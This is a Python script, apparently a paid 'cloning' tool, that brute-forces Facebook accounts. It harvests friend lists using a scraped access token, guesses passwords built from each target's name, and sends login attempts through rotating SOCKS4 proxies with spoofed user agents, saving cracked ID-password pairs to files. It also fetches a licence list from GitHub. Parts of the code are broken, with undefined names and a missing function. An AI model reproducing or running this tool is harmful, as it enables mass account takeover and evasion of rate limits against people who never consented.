
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
	#os.system('git clone https://github.com/Hannan-404/FILE')
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKAVI')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 2.2; en-us; GT-I9000 Build/MASTER) '
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
try:
    url_proxy = random.choice([
              "https://github.com/Kavihacker/hacker/blob/main/Aprl.txt",
])
except:pass


def uaku():
	try:
		ua=open('Aprl.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Kavihacker/hacker/blob/main/Aprl.txt').text
		ua=open('.Aprl.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.Aprl.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def sawrojj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
	
#------------------[ MAIN ]-----------------#



def banner():
	os.system("clear")
	print (f"""
\033[38;5;196m.##..##...####...##..##..######.
\033[1;97m.##.##...##..##..##..##....##...
\033[38;5;196m.####....######..##..##....##...
\033[1;97m.##.##...##..##...####.....##...
\033[38;5;196m.##..##..##..##....##....######.

\033[38;5;46m WELCOME : KAVI CYBERWORLD 
\033[38;5;46m TOOL OWNER : KAVI
\033[38;5;46m VERSION :  0.2
\033[38;5;46m STATUS :  PAID 

\033[38;5;206mCREATE  BY KAVI SRI LANKA 💙❤️💗💗🌹
\033[38;5;206mENJOY 


             """)



   


def approval():
  uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.geteuid())
  id = "".join(uuidd).replace("_","").replace("a","A").replace("u","U")
  plat = platform.version()[2:][:3].upper()+platform.release()[6:][::1].upper()+platform.version()[:6]
  xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
  key = " KAVI "+id+xp+"Y-"
  os.system('clear')
  banner()
  
  print("\033[1;37m [] YOU NEED APPROVAL TO USE THIS TOOL   \033[1;37m")
  print("\033[1;37m [] YOUR KEY:\x1b[1;92m \n"+key);time.sleep(0.1)
  print ("""\033[1;37m===============================================""")
  try:
    httpCaht = requests.get("https://github.com/Kavihacker/hacker/blob/main/Aprl.txt").text
    if id in httpCaht:
      sawrojj("\033[1;97m [] CONGRALUTATIONS !!!YOUR KEY WAS APROVED")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      sawrojj("\x1b[1;97m [×] SORRY "+str(nm))
      sawrojj("\x1b[1;97m [] YOUR KEY WAS NOT APPROVED ")
      print("\033[1;37m [] COPY YOUR KEY AND SEND TO ADMIN"); time.sleep(0.1)
      input(' [] CLICK ENTER TO SEND YOUR KEY ')
      os.system('xdg-open https://wa.me/+94703243339')
      time.sleep(1)
      sys.exit()
  except: 
    sys.exit() 
    if name == '__main__': 
     approval() 
approval()

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('CHECK INTERNET CONNECTION, CHECK AND TRY AGAIN')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		cookie = input(' [] COOKIE: ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		sawrojj('\x1b[1;92m [KAVI] LOGIN DONE.........RUN AGAIN!!!!')
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'{m} [×] LOGIN ERROR....TRY AGAIN !!!')
		exit()
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('{m} INVALID COOKIE ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	sawrojj('\x1b[1;97m [1] Public Cloning\n [2] File Cloning\n [3] Check Results\n [4] Contact with Admin\n [0] EXIT ')
	sawrojj('------------------------------------------------')
	SAWROJ= input('\x1b[1;92m [] CHOOSE: ');time.sleep(0.01)
	if SAWROJ in ['1']:
		public()
	elif SAWROJ in ['2']:
		crack_file()
	elif SAWROJ in ['3','03']:
		result()
	elif SAWROJ in ['4','04']:
		os.system('xdg-open https://wa.me/+94703243339')
	elif SAWROJ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('#DONE LOGOUT ')
		exit()
	else:
		print('# SELECT CORRECTLY ')
		back()
def error():
	print(f'{k}#TRY AGAIN {u}')
	time.sleep(4)
	back()
	
def result():
	os.system('clear')
	banner()
	print(' 1. CP ACCOUNT ')
	print(' 2. OK ACCOUNT')
	print(' 0. EXIT	')
	kz = input('\n Choose : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Not Found')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n   Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' CHOOSE RIGHT OPTION ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="yellow")
				nocp +=1
			input('[ Click Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(' No OK FILE HERE ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' SELECT RIGHT OPTION ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="green")
				nocp +=1
			input('[ CLICK ENTER 2 BACK ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('SELECT RIGHT OPTION ')
		exit()

def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		jum = int(input('\x1b[1;97m [] ENTER THE NUMBERS OF IDZ: '))
	except ValueError:
		print(' INVALID OPTION ')
		back()
	if jum<1 or jum>100000000:
		print('#TRY AGAIN ')
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [] INPUT ID '+str(yz)+': ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('#TRY AGAIN ')
			os.system('clear')
	try:
		print(f' [] TOTAL ID: {P}'+str(len(id)))
		print('')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
		time.sleep(3)
		back()
		
def crack_file():
	os.system('clear')
	banner()
	o = input('\x1b[1;97m [] FILE NAME : ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
    
	print('\x1b[1;92m LOGIN METHOD\n\x1b[1;97m [1] METHOD 1\n [2] METHOD 2 ')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['9','09']:
		method.append('mbasic')
	else:
		method.append('mobile')
	passwrd()
	exit()

def passwrd():
	os.system('clear')
	banner()
	print("\x1b\033[38;5;196mUSE MOBILE DATA\033[1;37m")
	print('\x1b\033[38;5;196mTOTAL IDz : '+str(len(id)))
	print("\x1b\033[38;5;196mPROCESS HAS BEEN STARTED")
	print("\x1b\033[38;5;196mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
	sawrojj(f'-----------------------------------------------')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'786')
					
					
				pool.submit(crack,idf,pwv)
	print('')
	sawrojj('-----------------------------------------------')
	sawrojj('CLONING COMPLETE .......... ')
	print(f'{h}[{h}•{h}]{h} OK : {h}%s '%(ok))
	input('CLICK ENTER TO EXIT ')
		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r [KAVI] {P}{loop}{P}/{P}{len(id)}{P} OK{P}={H}{ok}{P} {'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[38;5;206m [KAVI-CP] {idf}  {pw} {N}')     
				open('/sdcard/CP/'+cpc,'a').write(idf+' '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H} [SUCCESS BRO💚] {idf}  {pw}')
				open('/sdcard/OK/'+okc,'a').write(idf+' '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
	
